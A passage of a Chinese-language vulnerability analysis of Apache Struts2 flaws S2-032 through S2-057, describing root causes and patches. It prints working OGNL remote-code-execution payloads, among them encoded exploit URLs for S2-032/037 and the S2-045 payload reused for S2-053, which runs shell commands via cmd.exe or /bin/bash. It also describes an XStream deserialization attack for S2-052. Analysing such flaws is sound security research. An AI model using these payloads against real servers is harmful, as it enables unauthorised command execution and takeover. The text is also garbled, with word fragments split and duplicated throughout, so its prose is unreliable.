\u8fd9\u4e2a \u51fd\u6570 \u91cc \uff0c \u6211\u4eec \u53ef\u4ee5 \u770b\u5230 \u4ed6 \u5c06 \u524d\u9762 \u53ef\u63a7 \u7684 methodName \u653e\u8fdb \u4e86   ognlUtil . getValue   \uff0c \u5bfc\u81f4 \u4e86 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6267\u884c   \u9700\u8981 \u6ce8\u610f \u7684 \u662f \uff0c \u5728 \u524d\u9762 \u8c03\u7528 \u7684 interceptor \u91cc \u4e0d\u80fd \u51fa\u73b0 \u5f02\u5e38 \u51fa\u73b0\u5f02\u5e38 \u7684 \u60c5\u51b5 \uff0c \u4f1a \u5bfc\u81f4 \u65e0\u6cd5 \u6267\u884c \u5230 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6267\u884c \u7684 \u4f4d\u7f6e \u3002 \u8fd9 \u4e5f \u5c31\u662f \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 \u4e0d\u80fd \u5728 \u5f00\u542f   devMode   \u7684 \u60c5\u51b5 \u4e0b \u8fdb\u884c \u5229\u7528 \u7684 \u539f\u56e0 \u3002   POC   http   :   / / localhost : 8080 / showcase _ war / orders / 3 ! % 23 _ memberAccess% 3D% 40ognl . OgnlContext% 40DEFAULT _ MEMBER _ ACCESS% 2C% 23process% 3D% 40java . lang . Runtime% 40getRuntime ( ) . exec ( % 23parameters . command% 5B0% 5D ) % 2C% 23ros% 3D ( % 40org . apache . struts2 . ServletActionContext% 40getResponse ( ) . getOutputStream ( ) ) % 2C% 40org . apache . commons . io . IOUtils% 40copy ( % 23process . getInputStream ( ) % 2C% 23ros ) % 2C% 23ros . flush ( ) % 2C% 23xx% 3D123% 2C% 23xx . toString . json ? command = ifconfig   / /   S2 - 037   http   :   / / localhost : 8080 / showcase _ war / orders / 3 ! ( % 23 _ memberAccess% 3D% 40ognl . OgnlContext% 40DEFAULT _ MEMBER _ ACCESS ) % 3F ( % 23process% 3D% 40java . lang . Runtime% 40getRuntime ( ) . exec ( % 23parameters . command% 5B0% 5D ) % 2C% 23ros% 3D ( % 40org . apache . struts2 . ServletActionContext% 40getResponse ( ) . getOutputStream ( ) ) % 2C% 40org . apache . commons . io . IOUtils% 40copy ( % 23process . getInputStream ( ) % 2C% 23ros ) % 2C% 23ros . flush ( ) ) % 3Ad . json ? command = ifconfig   \u8fd9\u91cc \u6211\u4eec \u6267\u884c \u7684 \u547d\u4ee4 \u7528   # parameters . command [ 0 ]   \u7684 \u65b9\u5f0f \u6765 \u83b7\u53d6 \uff0c \u8fd9 \u56e0\u4e3a \u662f\u56e0\u4e3a \u5728 \u751f\u6210   DefaultActionProxy   \u7684 \u65f6\u5019 \u5bf9 methodName \u505a \u4e86 \u8f6c\u4e49 \u5904\u7406 \uff0c \u4e3a\u4e86 \u907f\u514d \u8f6c\u4e49 \u7834\u574f OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u7528   # parameters   \u7684 \u65b9\u5f0f \u4ece \u53c2\u6570 \u4e2d \u83b7\u53d6 \u3002   \u8fd8\u6709 \u4e00\u4e2a \u9700\u8981 \u6ce8\u610f \u7684 \u5730\u65b9 \u662f \uff0c \u5728 \u6700\u540e \u8c03\u7528   ognlUtil . getValue   \u65f6 \uff0c \u5728 methodName \u540e\u9762 \u62fc\u63a5 \u4e86   ( )   \uff0c \u6211\u4eec \u9700\u8981 \u5c06 \u8fd9\u4e2a   ( )   \u505a \u5904\u7406 \uff0c \u6bd4\u5982 \u8fd9\u91cc \u7684 POC \u505a \u7684 \u5904\u7406 \u662f   # xx . toString   \u53bb \u5403\u6389 \u8fd9\u4e2a   ( )   S2 - 032 / S2 - 033 \u4fee\u590d   xwork - core : 2.3 . 28.1   \u5728   OgnlUtil . isEvalExpression   \u589e\u52a0 \u4e86   isSequence   \u7684 \u5224\u65ad   \u8fd9\u91cc \u51fa\u73b0 \u4e86 \u65b0 \u7684 \u4e00\u79cd \u5229\u7528 \u65b9\u5f0f   ( 1 ) ? ( 2 ) : ( 3 )   \uff0c \u8fd9\u79cd \u5f62\u5f0f \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u5c06 \u6709   ASTTest   \u5bf9\u8c61 \u6765 \u5904\u7406   \u800c   isEvalChain ( )   \u548c   isSequence ( )   \u9650\u5236 \u7684 \u662f   ASTEval   \u548c   ASTSequence   \u5bf9\u8c61 \uff0c \u8fd9\u91cc \u5e76 \u6ca1\u6709 \u5bf9 ASTTest \u505a \u9650\u5236 \uff0c \u5e76\u4e14 \u7531\u4e8e   isSequence   \u5e76 \u4e0d\u662f \u9012\u5f52 \u53bb \u5224\u65ad \u7684 \uff0c \u6240\u4ee5 \u5728   ASTTest   \u7684 children \u8282\u70b9 \u4e0a \u518d \u51fa\u73b0   ASTSequence   \u4e5f \u662f ok \u7684   \u6839\u636e \u8fd9\u4e2a \u539f\u7406 \uff0c \u6211\u4eec \u53ef\u4ee5 \u5199\u51fa \u65b0 \u7684 POC   (   #   _ memberAccess   =   @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   )   ?   (   #   process   =   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   #   parameters   .   command   [   0   ]   ) ,   #   ros   =   (   @ org . apache . struts2 . ServletActionContext @ getResponse   ( ) .   getOutputStream   ( ) ) ,   @ org . apache . commons . io . IOUtils @ copy   (   #   process   .   getInputStream   ( ) ,   #   ros   ) ,   #   ros   .   flush   ( ) ) :   d   .   json   S2 - 037 \u4fee\u590d   \u5728 \u89e3\u6790   name ! method   \u7684 \u5730\u65b9 \uff0c \u8c03\u7528 \u4e86   cleanupActionName   \u4f7f\u7528 \u4e86 \u6b63\u5219 \uff0c \u9632\u6b62 \u51fa\u73b0 \u9632\u6b62\u51fa\u73b0   ( # @ )   \u7b49 \u7279\u6b8a \u5b57\u7b26 \u7279\u6b8a\u5b57\u7b26 \uff0c \u51fa\u73b0 \u5c31 \u62a5\u9519 \uff0c \u4e5f \u5c31 \u5230 \u4e0d\u4e86 \u540e\u7eed \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6267\u884c   \u5e76\u4e14 \u5728 \u7981\u6b62 \u7684 class \u5217\u8868 \u91cc \u589e\u52a0 \u4e86 \u4e24\u4e2a   \u4f7f\u5f97 \u6211\u4eec \u4e0d\u80fd \u5728 \u7528   #_ memberAccess = @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   \u6765 \u7ed5\u8fc7 \u9650\u5236   \u4e00\u4e2a \u6709\u610f \u610f\u601d \u6709\u610f\u601d \u7684 \u5730\u65b9   \u524d\u9762 \u8bf4 \u5230 \u8fd9 3 \u4e2a \u6f0f\u6d1e \u9700\u8981 \u5f00\u542f DynamicMethodInvocation \uff0c \u5176\u5b9e \u4e0d \u5f00\u542f \u4e5f \u662f \u53ef\u4ee5 \u7684   \u524d\u9762 \u8bf4 \u7684 \u51e0\u79cd \u65b9\u6cd5 \u90fd \u662f \u5728 \u5904\u7406   name ! method   \u8fd9\u4e2a \u683c\u5f0f \uff0c rest \u5176\u5b9e \u8fd8 \u652f\u6301 \u5bf9   action / id / method   \u7684 \u89e3\u6790   \u6240\u4ee5 \u6539\u6539 POC \u5c31 \u80fd \u901a\u6740 rest - plugin \u4e86   http   :   / / localhost : 8080 / showcase _ war / orders / 3 / ( % 23 _ memberAccess% 3D% 40ognl . OgnlContext% 40DEFAULT _ MEMBER _ ACCESS ) % 3F ( % 23process% 3D% 40java . lang . Runtime% 40getRuntime ( ) . exec ( % 23parameters . command% 5B0% 5D ) % 2C% 23ros% 3D ( % 40org . apache . struts2 . ServletActionContext% 40getResponse ( ) . getOutputStream ( ) ) % 2C% 40org . apache . commons . io . IOUtils% 40copy ( % 23process . getInputStream ( ) % 2C% 23ros ) % 2C% 23ros . flush ( ) ) % 3Ad . json ? command = ifconfig   14 .   S2 - 045 / S2 - 046   \u5f71\u54cd \u7248\u672c \uff1a Struts   2.3 . 5   -   Struts   2.3 . 31 ,   Struts   2.5   -   Struts   2.5 . 10   S2 - 046 \u539f\u7406 \u4e00\u6837 \uff0c \u8fd9\u91cc \u53ea \u5206\u6790 S2 - 045   \u8fd9\u91cc 2.3 \u548c 2.5 \u7248\u672c \u53d8\u5316 \u6bd4\u8f83 \u5927 \uff0c \u8fd9\u91cc \u4ee5 2.3 . 31 \u7684 \u4ee3\u7801 \u5206\u6790 \uff0c \u770b 2.5 \u7684 \u53ef\u4ee5 \u770b https : / / paper . seebug . org / 247 /   \u4ece struts2 \u7684 \u5de5\u4f5c \u6d41\u7a0b \u6d41\u7a0b\u56fe \u6765\u770b \uff0c \u6240\u6709 \u7684 \u8bf7\u6c42 \u5728 \u751f\u6210 ActionProxy \u4e4b\u524d \uff0c \u90fd \u7531 FilterDispatcher \u6765 \u5904\u7406 \uff0c 2.3 \u7248\u672c \u7528 \u7684 \u662f   org . apache . struts2 . dispatcher . ng . filter . StrutsPrepareAndExecuteFilter   \uff0c \u8fd9\u91cc \u5728 \u8c03\u7528 action \u4e4b\u524d \u4f1a\u5148 \u5c01\u88c5 request \u3002   \u770b\u770b \u8c03\u7528 \u6808   \u5c01\u88c5 \u5b9e\u9645 \u7531   org . apache . struts2 . dispatcher . Dispatcher # wrapRequest   \u5904\u7406   \u53ef\u4ee5 \u770b\u5230 \u8fd9\u91cc \u5728 \u5904\u7406   Content - Type :   multipart / form - data   \u7c7b\u578b \u65f6 \uff0c \u4f1a \u751f\u6210   org . apache . struts2 . dispatcher . multipart . MultiPartRequestWrapper   \u5904\u7406 \uff0c S2 - 045 \u5c31\u662f \u51fa \u95ee\u9898 \u5728 \u8fd9\u91cc   \u5728 \u7528   JakartaMultiPartRequest   \u89e3\u6790 request \u5305\u65f6 \uff0c \u8c03\u7528   org . apache . commons . fileupload . FileUploadBase . FileItemIteratorImpl # FileItemIteratorImpl   \u6765 \u68c0\u67e5 Content - Type \u7684 \u5185\u5bb9 \uff0c \u9700\u8981 \u7531 multipart / \u5f00\u5934 \u624d\u884c \uff0c \u4e0d\u7136 \u5c31\u662f \u62a5\u9519 \u5e76 \u5c06 \u5177\u4f53 \u7684 contentType \u5185\u5bb9 \u5199 \u5230 \u5f02\u5e38 \u91cc   \u8fd9\u91cc \u6211\u4eec \u7684 \u53ef\u63a7 \u6570\u636e \u5c31 \u5230 \u4e86 \u5f02\u5e38 \u4e0a \uff0c \u5c31 \u770b struts2 \u662f \u600e\u4e48 \u5904\u7406 \u5f02\u5e38 \u4e86   org . apache . struts2 . dispatcher . multipart . JakartaMultiPartRequest # parse   \u53ef\u63a7 \u5185\u5bb9 \u4f20\u5165 \u4e86   com . opensymphony . xwork2 . util . LocalizedTextUtil # findText   \u5f53\u524d \u90fd \u6ca1 \u751f\u6210 \u9519\u8bef \u8bef\u4fe1 \u4fe1\u606f \u9519\u8bef\u4fe1\u606f \u65f6 \uff0c \u5c06 \u83b7\u53d6 \u9ed8\u8ba4 \u7684 message   \u8fd9\u91cc \u5230 \u4e86 \u6211\u4eec \u719f\u6089 \u7684   TextParseUtil . translateVariables   \u51fd\u6570 \uff0c \u4ed6 \u540e\u7eed \u4f1a \u5904\u7406 \u8ba1\u7b97 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   \u7b80\u5355 \u6765\u8bf4 \uff0c \u6574\u4e2a \u8fc7\u7a0b \u4ece \u62a5\u9519 \u5f00\u59cb \u5b58\u5165 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u518d \u751f\u6210 \u9519\u8bef \u8bef\u4fe1 \u4fe1\u606f \u9519\u8bef\u4fe1\u606f \u7684 \u65f6\u5019 \u8ba1\u7b97 \u4e86 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   \u5230 \u4e86 \u8fd9\u91cc \u6267\u884c \u53ef\u63a7 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u662f \u7b2c\u4e00 \u4e00\u6b65 \u7b2c\u4e00\u6b65 \uff0c \u56e0\u4e3a 2.3 . 29 \u589e\u52a0 \u4e86 \u5bf9   #_ memberAccess = @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   \u7684 \u9650\u5236   \u9700\u8981 \u4e00\u79cd \u65b0 \u7684 \u601d\u8def \u6765 \u7ed5\u8fc7 \uff0c S2 - 045 \u7684 POC \u5c31 \u7ed9 \u6211\u4eec \u63d0\u4f9b \u8fd9\u6837 \u4e00\u4e2a \u601d\u8def   POC   %   {   (   #   _   =   '   multipart   /   form   -   data   '   ) .   (   #   dm   =   @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   ) .   (   #   _ memberAccess   ?   (   #   _ memberAccess   =   #   dm   ) :   (   (   #   container   =   #   context   [   '   com   .   opensymphony   .   xwork2   .   ActionContext   .   container   '   ]   ) .   (   #   ognlUtil   =   #   container   .   getInstance   (   @ com . opensymphony . xwork2 . ognl . OgnlUtil @ class   ) ) .   (   #   ognlUtil   .   getExcludedPackageNames   ( ) .   clear   ( ) ) .   (   #   ognlUtil   .   getExcludedClasses   ( ) .   clear   ( ) ) .   (   #   context   .   setMemberAccess   (   #   dm   ) ) ) ) .   (   #   cmd   =   '   id   '   ) .   (   #   iswin   =   (   @ java . lang . System @ getProperty   (   '   os   .   name   '   ) .   toLowerCase   ( ) .   contains   (   '   win   '   ) ) ) .   (   #   cmds   =   (   #   iswin   ?   {   '   cmd   .   exe   ' , '   /   c   '   ,   #   cmd   } : {   '   /   bin   /   bash   ' , '   -   c   '   ,   #   cmd   } ) ) .   (   #   p   =   new   java   .   lang   .   ProcessBuilder   (   #   cmds   ) ) .   (   #   p   .   redirectErrorStream   (   true   ) ) .   (   #   process   =   #   p   .   start   ( ) ) .   (   #   ros   =   (   @ org . apache . struts2 . ServletActionContext @ getResponse   ( ) .   getOutputStream   ( ) ) ) .   (   @ org . apache . commons . io . IOUtils @ copy   (   #   process   .   getInputStream   ( ) ,   #   ros   ) ) .   (   #   ros   .   flush   ( ) )   }   \u4e3b\u8981 \u770b 5 - 10 \u884c \uff0c \u4e00 \u5f00\u59cb \u7684 \u601d\u8def \u662f \u76f4\u63a5 \u7528 \u8d4b\u503c \u7684 \u65b9\u5f0f \u6765 \u8986\u76d6 \u5b58\u5728 \u9650\u5236 \u7684 SecurityMemberAccess \uff0c \u4f46\u662f \u73b0\u5728 \u6709 \u4e86   excludedClasses   \u7684 \u9650\u5236 \u4e0d\u80fd \u76f4\u63a5 \u7528 \u8fd9\u79cd \u65b9\u5f0f \u6765 \u8fbe\u6210 \uff08 \u5177\u4f53 \u770b   SecurityMemberAccess . isAccessible   \uff09 \u3002   \u90a3\u4e48 \u5c31 \u770b\u770b \u80fd \u4e0d\u80fd \u7528 setters \u53bb \u8bbe\u7f6e   SecurityMemberAccess   \u8fd9\u91cc \u5c31 \u770b   ognl . OgnlContext # setMemberAccess   \uff0c \u800c \u8fd9\u4e2a context \u5c31\u662f \u6211\u4eec \u5728 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u91cc \u7528   # context   \u8868\u793a \u7684   \u90a3\u4e48 \u76f4\u63a5 \u7528   # context . setMemberAccess ( @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS )   \u5c31 \u53ef\u4ee5 \u8986\u76d6 \u539f\u6709 \u7684 MemberAccess \uff0c \u4f46\u662f \u56e0\u4e3a   # context   \u672c\u8eab \u5c31\u662f \u88ab \u7981\u6b62 \u7684 \u7c7b \uff0c \u6211\u4eec \u4e0d\u80fd \u76f4\u63a5 \u8c03\u7528 \u4ed6 \u3002   \u6211\u4eec \u9700\u8981 \u9996\u5148 \u53bb \u9664\u6389   ExcludedPackageNames   \u548c   ExcludedClasses   \u6765 \u770b\u770b \u4ed6 \u662f \u600e\u4e48 \u8bbe\u7f6e \u7684   com . opensymphony . xwork2 . ognl . OgnlValueStack # setOgnlUtil   \u53ef\u4ee5 \u770b\u5230   securityMemberAccess   \u7684 \u76f8\u5173 \u7981\u7528 \u8bbe\u7f6e \u90fd \u662f \u6765\u81ea \u4e8e   ognlUtil   \uff0c \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u53ea \u9700\u8981 \u6e05\u9664 \u6389   ognlUtil   \u7684 \u7981\u7528 \u8bbe\u7f6e \u5c31 \u53ef\u4ee5 \u6d88\u9664 \u6389   securityMemberAccess   \u7684 \u9650\u5236 \u3002 \u8fd9 \u56e0\u4e3a \u662f\u56e0\u4e3a \u5728 jvm \u91cc\u9762 \u4ed6\u4eec \u7528 \u7684 \u90fd \u662f \u540c\u4e00 \u4e00\u4e2a \u540c\u4e00\u4e2a \u5b9e\u4f8b \u3002   \u6240\u4ee5 \u4e0a\u9762 \u7684 POC \u4e2d\u7528 struts2 \u7684 container \u7684 \u65b9\u5f0f \u53bb \u83b7\u53d6 ognlUtil \u5b9e\u4f8b \uff0c \u5e76 \u5c06 \u5176 \u7981\u7528 \u8bbe\u7f6e \u5168\u90e8 \u6e05\u9664 \u6389   \u90a3\u4e48 \u540e\u9762 \u518d\u7528   # context . setMemberAccess   \u5c31 \u6ca1\u6709 \u963b\u788d \u4e86   \u540e\u7eed \u7684 \u4ee3\u7801 \u5c31\u662f \u6267\u884c \u5e76 \u56de\u663e \u4e86 \uff0c \u8ddf \u524d\u9762 \u7684 \u7c7b\u4f3c   \u4fee\u590d   \u4fee\u590d \u4e3b\u8981 \u662f \u4e0d \u628a message \u4f20\u5165 \uff0c \u653e\u5230 \u4e86 args \u7684 \u4f4d\u7f6e   15 .   S2 - 048   \u8fd9 \u4e00\u90e8 \u90e8\u5206 \u4e00\u90e8\u5206 \u4e0d \u4ed4\u7ec6 \u8bf4 \u4e86 \uff0c \u770b https : / / www . freebuf . com / vuls / 217482 . html   16 .   S2 - 052   \u5f71\u54cd \u8303\u56f4 : Struts   2.1 . 6   -   Struts   2.3 . 33 ,   Struts   2.5   -   Struts   2.5 . 12   The   REST   Plugin   is   using   a   XStreamHandler   with   an   instance   of   XStream   for   deserialization   without   any   type   filtering   and   this   can   lead   to   Remote   Code   Execution   when   deserializing   XML   payloads .   struts2 \u7684 rest \u63d2\u4ef6 \u6ce8\u518c \u4e86 ContentTypeInterceptor \u6765 \u5904\u7406 \u4e0d\u540c \u7684 content - type   \u9488\u5bf9 xml \u7c7b\u578b \uff0c \u5c06 \u8c03\u7528   XStreamHandler   \u6765 \u5904\u7406   org . apache . struts2 . rest . ContentTypeInterceptor # intercept   \u6839\u636e request \u8bf7\u6c42 \u9009\u62e9 handler \uff0c \u8fd9\u91cc \u6211\u4eec \u4f20\u5165   application / xml   \u7c7b\u578b \uff0c \u5c06 \u4f7f\u7528   org . apache . struts2 . rest . handler . XStreamHandler # toObject   \u6765 \u5904\u7406 xml   \u8fd9\u91cc \u7528 \u4e86 \u6700 \u7b80\u5355 \u7684 \u8c03\u7528 \u65b9\u5f0f \uff08 1.4 . 8 \u7248\u672c \uff09 \uff0c \u6ca1\u6709 \u505a xstream \u7684 \u76f8\u5173 \u5b89\u5168 \u5904\u7406 \uff0c \u5bfc\u81f4 XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316   \u6240\u4ee5 \u6211\u4eec \u4f20\u5165 \u6784\u9020 \u597d \u7684 XML \u5c31 \u53ef\u4ee5 \u8fbe\u5230 \u547d\u4ee4 \u6267\u884c   POC   \u8fd9\u91cc \u7684 xml \u53ef\u4ee5 \u7528 \u6211 \u7684 ysomap \u53bb \u751f\u6210 \uff0c \u628a Content - Type \u8bbe\u7f6e \u6210   application / xml   \u5c31 \u53ef\u4ee5 \u4e86   \u4fee\u590d   S2 - 052 \u8ddf \u4ee5\u5f80 \u7684 \u6f0f\u6d1e \u4e0d \u4e00\u6837 \uff0c \u8fd9\u91cc \u8ddf OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u5e76 \u6ca1\u6709 \u4ec0\u4e48 \u5173\u7cfb \u4e86 \uff0c \u4fee\u590d \u4e5f \u6bd4\u8f83 \u7b80\u5355 \u6bd4\u8f83\u7b80\u5355   \u5347\u7ea7 XStream \u5230 \u4e86 1.4 . 10 \u7248\u672c \uff0c \u5e76\u4e14 \u6dfb\u52a0 \u4e86 \u5b89\u5168 \u63aa\u65bd \u5b89\u5168\u63aa\u65bd   \u8fd9\u91cc \u65b0 \u6dfb\u52a0 \u4e86   AllowedClasses   \u3001   AllowedClassNames   \u3001   XStreamPermissionProvider   \u6765 \u8bbe\u7f6e \u6bcf\u4e2a \u7c7b \u53ef\u4ee5 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u5bf9\u8c61 \u5217\u8868   \u4e5f \u4f1a \u6dfb\u52a0 \u4e00\u4e9b \u9ed8\u8ba4 \u7684 \u7c7b   \u8fd9\u91cc \u7684 \u7528\u6cd5 \u5c31\u662f XStream \u5b98\u65b9 \u63a8\u8350 \u7684 \uff0c \u91c7\u7528 \u540d\u5355 \u767d\u540d\u5355 \u7684 \u65b9\u5f0f \u6765 \u9632\u6b62 \u4e0d \u5b89\u5168 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316   17 .   S2 - 053   \u5f71\u54cd \u7248\u672c : Struts   2.0 . 0   -   2.3 . 33   , Struts   2.5   -   Struts   2.5 . 10.1   S2 - 053 \u95ee\u9898 \u51fa \u5728 freemarker \u7684 \u6807\u7b7e \u5185\u5bb9 \u53ef\u63a7 \u65f6 \u51fa\u73b0 \u7684 \u95ee\u9898   \u5728 action \u6267\u884c \u7ed3\u675f \u540e \uff0c \u7531\u4e8e \u8bbe\u7f6e \u7684 \u7c7b\u578b \u4e3a freemarker \uff0c \u6240\u4ee5 \u7ed3\u679c \u4ea4\u7531 freemarker \u6765 \u5904\u7406   \u5173\u6ce8 \u5bf9 freemarker \u6807\u7b7e \u89e3\u6790 \u7684 \u7c7b   org . apache . struts2 . views . freemarker . tags . CallbackWriter # onStart   \u56e0\u4e3a \u8fd9\u91cc \u6211\u4eec \u65f6 url \u6807\u7b7e \uff0c \u6240\u4ee5 \u7531   org . apache . struts2 . components . URL # start   \u6765 \u5904\u7406   \u56de\u5230 \u4e86 \u7531   ServletUrlRenderer   \u6765 \u89e3\u6790 \u6211\u4eec \u4f20\u5165 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u8ddf S2 - 013 \u4e00\u6837 \uff0c \u540e\u7eed \u4e5f \u662f \u7531   TextParseUtil . translateVariables   \u89e6\u53d1 \u7684   POC   poc \u53ef\u4ee5 \u76f4\u63a5 \u7528 S2 - 045 \u7684 poc   %   { (   #   dm   =   @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   ) . (   #   _ memberAccess   ?   (   #   _ memberAccess   =   #   dm   ) : ( (   #   container   =   #   context   [   '   com   .   opensymphony   .   xwork2   .   ActionContext   .   container   '   ]   ) . (   #   ognlUtil   =   #   container   .   getInstance   (   @ com . opensymphony . xwork2 . ognl . OgnlUtil @ class   ) ) . (   #   ognlUtil   .   getExcludedPackageNames   ( ) .   clear   ( ) ) . (   #   ognlUtil   .   getExcludedClasses   ( ) .   clear   ( ) ) . (   #   context   .   setMemberAccess   (   #   dm   ) ) ) ) . (   #   cmd   =   '   id   '   ) . (   #   iswin   =   (   @ java . lang . System @ getProperty   (   '   os   .   name   '   ) .   toLowerCase   ( ) .   contains   (   '   win   '   ) ) ) . (   #   cmds   =   (   #   iswin   ?   {   '   cmd   .   exe   ' , '   /   c   '   ,   #   cmd   } : {   '   /   bin   /   bash   ' , '   -   c   '   ,   #   cmd   } ) ) . (   #   p   =   new   java   .   lang   .   ProcessBuilder   (   #   cmds   ) ) . (   #   p   .   redirectErrorStream   (   true   ) ) . (   #   process   =   #   p   .   start   ( ) ) . (   @ org . apache . commons . io . IOUtils @ toString   (   #   process   .   getInputStream   ( ) ) ) }   / /   \u8bb0\u5f97 \u7f16\u7801   \u4fee\u590d   \u8fd9\u6b21 \u7684 \u4fee\u590d \u662f \u5728 FreemarkerManager \u4e2d\u591a \u4e86 \u4e24\u884c \u4ee3\u7801 \uff0c   LOG . debug ( \" Sets   NewBuiltinClassResolver   to   TemplateClassResolver . SAFER _ RESOLVER \" ,   new   String [ 0 ] ) ;   configuration . setNewBuiltinClassResolver ( TemplateClassResolver . SAFER _ RESOLVER ) ;   \u53bb \u770b \u4e86 \u4e00\u4e0b TemplateClassResolver . SAFER _ RESOLVER ) \u7684 \u5b98\u65b9 \u6587\u6863 \uff0c   TemplateClassResolver . SAFER _ RESOLVER   now   disallows   creating   freemarker . template . utility . JythonRuntime   and   freemarker . template . utility . Execute .   This   change   affects   the   behavior   of   the   new   built - in   if   FreeMarker   was   configured   to   use   SAFER _ RESOLVER ,   which   is   not   the   default   until   2.4   and   is   hence   improbable .   \u5927\u81f4 \u610f\u601d \u5e94\u8be5 \u5c31\u662f \u7981\u6b62 \u4e86 freemarker \u7684 RCE \uff0c \u5177\u4f53 \u6211 \u5bf9 freemarker \u4e0d\u592a \u4e86\u89e3 \uff0c \u5c31 \u4e0d \u53bb \u8bef\u4eba \u4eba\u5b50 \u5b50\u5f1f \u8bef\u4eba\u5b50\u5f1f \u4e86 \u3002   \u4fee\u590d \u76f4\u63a5 \u53c2\u8003 https : / / www . freebuf . com / vuls / 217482 . html   18 .   S2 - 055   \u5f71\u54cd \u8303\u56f4 \uff1a Struts   2.5   -   Struts   2.5 . 14   S2 - 055 \u6f0f\u6d1e \u539f\u7406 \u8ddf S2 - 052 \u4e00\u6837 \uff0c \u7531 jackson \u5e93 \u5904\u7406 json \u5185\u5bb9 \u65f6 \u4ea7\u751f \u7684 \u6f0f\u6d1e \uff0c \u8fd9\u91cc \u9ed8\u8ba4 \u4e0d\u662f \u7528 jackson \u5904\u7406 json \u5185\u5bb9 \u7684 \uff0c \u5f97 \u5728 struts . xml \u914d\u7f6e   < bean   type =   \" org . apache . struts2 . rest . handler . ContentTypeHandler \"   name =   \" jackson \"   class =   \" org . apache . struts2 . rest . handler . JacksonLibHandler \"   / >   < constant   name =   \" struts . rest . handlerOverride . json \"   value =   \" jackson \"   / >   \u8fd9\u91cc \u672c\u8eab \u56e0\u4e3a \u662f\u56e0\u4e3a jackson \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u95ee\u9898 \u4ea7\u751f \u7684 \uff0c \u540e\u9762 \u62bd\u7a7a \u5206\u6790 \u4e00\u4e0b \u8fd9\u4e2a jackson \uff0c \u8fd9\u91cc \u4e0d \u7ee7\u7eed \u5206\u6790 \u4e86   \u56e0\u4e3a \u9700\u8981 \u914d\u7f6e \u624d \u53ef\u4ee5 \u6253 \uff0c \u6240\u4ee5 \u8fd9\u91cc \u7684 \u5371\u5bb3 \u5e76 \u6ca1\u6709 \u60f3 xstream \u4e00\u6837 \u4e25\u91cd   \u5177\u4f53 \u5206\u6790 \u5177\u4f53\u5206\u6790 \u89c1   http : / / xxlegend . com / 2017 / 12 / 06 / S2 - 055% E6% BC% 8F% E6% B4% 9E% E7% 8E% AF% E5% A2% 83% E6% 90% AD% E5% BB% BA% E4% B8% 8E% E5% 88% 86% E6% 9E% 90 /   19 .   S2 - 057   \u5f71\u54cd \u8303\u56f4 \uff1a Struts   2.0 . 4   -   Struts   2.3 . 34 ,   Struts   2.5 . 0   -   Struts   2.5 . 16   \u5317\u4eac \u65f6\u95f4 8 \u6708 22 \u65e5 13 \u65f6 \uff0c Apache \u5b98\u65b9 \u53d1\u5e03 \u901a\u544a \u516c\u5e03 \u4e86 Struts2 \u4e2d \u4e00\u4e2a \u8fdc\u7a0b \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c \u6f0f\u6d1e \uff08 CVE - 2018 - 11776 \uff09 \u3002 \u8be5 \u6f0f\u6d1e \u5728 \u4e24\u79cd \u60c5\u51b5 \u4e0b \u5b58\u5728 \uff0c \u7b2c\u4e00 \uff0c \u5728 xml \u914d\u7f6e \u4e2d\u672a \u8bbe\u7f6e namespace \u503c \uff0c \u4e14 \u4e0a\u5c42 \u52a8\u4f5c \u914d\u7f6e \uff08 upper   action ( s )   configurations \uff09 \u4e2d\u672a \u8bbe\u7f6e \u6216\u7528 \u901a\u914d\u7b26 namespace \u503c \u3002 \u7b2c\u4e8c \uff0c \u4f7f\u7528 \u672a \u8bbe\u7f6e   value \u548c action \u503c \u7684 url \u6807\u7b7e \uff0c \u4e14 \u4e0a\u5c42 \u52a8\u4f5c \u914d\u7f6e \uff08 upper   action ( s )   configurations \uff09 \u4e2d\u672a \u8bbe\u7f6e \u6216\u7528 \u901a\u914d\u7b26 namespace \u503c \u3002   https : / / paper . seebug . org / 682 /   \u8fd9\u91cc \u4e00\u79cd \u914d\u7f6e \u65b9\u6848 \u662f   \u6ca1\u6709 \u914d\u7f6e namespace \uff0c \u8bbf\u95ee s2057 . action \u90fd \u4f1a \u5bfc\u5411 test . action \uff0c \u8fd9\u91cc \u5904\u7406 redirectAction \u7684 \u662f   org . apache . struts2 . dispatcher . ServletActionRedirectResult # execute   ServletActionRedirectResult   \u4f1a \u5c06 namespace \u4e00\u8d77 \u62fc\u63a5 \u8fdb location \uff0c \u6bd4\u5982   / s2vuls / $ { 1 * 2 } / s2057 . action   , \u5176 namespace \u4e3a   / $ { 1 * 2 }   , actionName \u4e3a \u8df3\u8f6c \u7684 test \uff0c \u6700\u7ec8 location \u4e3a   / $ { 1 * 2 } / test . action   